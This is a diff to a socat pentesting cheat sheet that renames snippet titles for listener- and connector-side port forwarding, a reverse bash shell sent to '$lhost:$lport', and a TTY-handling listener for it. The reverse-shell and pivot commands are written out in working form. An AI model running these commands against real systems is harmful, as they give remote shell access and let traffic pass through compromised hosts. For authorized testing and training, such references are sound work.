@@ -4,11 +4,9 @@
 
 ### Listener side
 
-Read listener side with Socat.
-
 Listen locally and forward incoming connections to another listening port.
 
-```sh title:"Socat Read Listener Side"
+```sh title:"Socat listener-side port forward"
 ./socat TCP-LISTEN:$listener_port,fork,reuseaddr TCP-LISTEN:$forward_port
 ```
 <!-- cheat
@@ -18,11 +16,9 @@ var forward_port
 
 ### Connector side
 
-Read connector side with Socat.
-
 Connect back to a listener and forward to localhost.
 
-```sh title:"Socat Read Connector Side"
+```sh title:"Socat connector-side port forward"
 ./socat "TCP:$connect_ip:$connect_port" "TCP:127.0.0.1:$forward_port"
 ```
 <!-- cheat
@@ -35,11 +31,9 @@ var forward_port
 
 ### Reverse shell
 
-Read reverse shell with Socat.
-
 Send an interactive bash shell to a socat listener.
 
-```sh title:"Socat Read Reverse Shell"
+```sh title:"Socat reverse bash shell"
 ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane "tcp:$lhost:$lport"
 ```
 <!-- cheat
@@ -49,11 +43,9 @@ var lport := 4444
 
 ### Reverse shell listener
 
-Read reverse shell listener with Socat.
-
 Catch a socat reverse shell with TTY handling.
 
-```sh title:"Socat Read Reverse Shell Listener"
+```sh title:"Socat reverse shell listener"
 socat "file:$(tty),raw,echo=0" "tcp-listen:$lport"
 ```
 <!-- cheat
